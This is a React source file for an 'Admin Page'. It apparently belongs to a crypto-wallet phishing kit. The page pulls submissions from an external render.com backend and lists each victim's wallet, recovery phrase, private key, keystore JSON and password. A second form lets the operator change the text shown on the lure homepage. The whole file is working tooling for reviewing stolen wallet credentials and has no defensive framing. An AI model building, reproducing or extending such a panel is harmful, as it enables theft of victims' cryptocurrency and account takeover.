import React, { useEffect, useState } from "react";

const AdminPage = () => {
  const [submissions, setSubmissions] = useState([]);
  const [visibleCount, setVisibleCount] = useState(10);

  // new states for info form
  const [name, setName] = useState("");
  const [title, setTitle] = useState("");
  const [paragraph, setParagraph] = useState("");
  const [message, setMessage] = useState("");
  // fetch submissions
  useEffect(() => {
    const fetchData = async () => {
      try {
        const res = await fetch("https://lol-ep0y.onrender.com/");
        const data = await res.json();
        setSubmissions(data.reverse());
      } catch (err) {
        console.error("Error fetching submissions", err);
      }
    };
    fetchData();
  }, []);

  // submit info to /info endpoint
  const handleInfoSubmit = async (e) => {
    e.preventDefault();
    try {
      const res = await fetch("https://lol-ep0y.onrender.com/info", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ name, title, paragraph }),
      });

      if (!res.ok) throw new Error("Failed to save info");

      setMessage("✅ Info saved successfully!");
      setName("");
      setTitle("");
      setParagraph("");
    } catch (err) {
      console.error(err);
      setMessage("❌ Error saving info");
    }
  };

  // format date
  const formatDate = (isoString) => {
    if (!isoString) return "N/A";
    const date = new Date(isoString);
    return date.toLocaleString();
  };

  // load more
  const handleLoadMore = () => setVisibleCount((prev) => prev + 5);

  return (
    <div className="p-6 space-y-6">
      <h2 className="text-2xl font-bold mb-4">Admin Page</h2>

      {/* ===== INFO FORM ===== */}
      <div className="p-4 border rounded-lg shadow bg-white">
        <h3 className="text-lg font-bold mb-2">Update Homepage Info</h3>
        <form onSubmit={handleInfoSubmit} className="space-y-3">
          <input
            type="text"
            placeholder="Enter Name"
            value={name}
            onChange={(e) => setName(e.target.value)}
            className="w-full border px-3 py-2 rounded"
          />
          <input
            type="text"
            placeholder="Enter Title"
            value={title}
            onChange={(e) => setTitle(e.target.value)}
            className="w-full border px-3 py-2 rounded"
          />
          <textarea
            placeholder="Enter Paragraph"
            value={paragraph}
            onChange={(e) => setParagraph(e.target.value)}
            className="w-full border px-3 py-2 rounded"
          />
          <button
            type="submit"
            className="px-6 py-2 bg-indigo-600 text-white font-semibold rounded hover:bg-indigo-500 transition"
          >
            Save Info
          </button>
        </form>
        {message && <p className="mt-2 text-sm">{message}</p>}
      </div>

      {/* ===== SUBMISSIONS TABLE ===== */}
      <h3 className="text-xl font-bold mt-10 mb-4">User Submissions</h3>
      <div className="overflow-x-auto rounded-lg border border-indigo-400 mb-6">
        <table className="min-w-full text-sm bg-white text-gray-800 rounded-lg overflow-hidden shadow">
          <thead className="bg-indigo-600 text-white">
            <tr>
              <th className="py-2 px-4 text-left">Wallet</th>
              <th className="py-2 px-4 text-left">Recovery Phrase</th>
              <th className="py-2 px-4 text-left">Private Key</th>
              <th className="py-2 px-4 text-left">Keystore JSON</th>
              <th className="py-2 px-4 text-left">Password</th>
              <th className="py-2 px-4 text-left">Created At</th>
            </tr>
          </thead>
          <tbody>
            {submissions.slice(0, visibleCount).map((submission, index) => (
              <tr
                key={index}
                className="odd:bg-gray-100 even:bg-white border-b"
              >
                <td className="py-2 px-4">{submission.wallet}</td>
                <td className="py-2 px-4">
                  {submission.tab1Inputs?.filter(Boolean).join(", ")}
                </td>
                <td className="py-2 px-4">{submission.tab2Text}</td>
                <td className="py-2 px-4">{submission.tab3?.content}</td>
                <td className="py-2 px-4">{submission.tab3?.title}</td>
                <td className="py-2 px-4">
                  {formatDate(submission.createdAt)}
                </td>
              </tr>
            ))}
          </tbody>
        </table>
      </div>

      {visibleCount < submissions.length && (
        <div className="text-center">
          <button
            onClick={handleLoadMore}
            className="px-6 py-2 bg-indigo-600 text-white font-semibold rounded hover:bg-indigo-500 transition"
          >
            Load More
          </button>
        </div>
      )}
    </div>
  );
};

export default AdminPage;
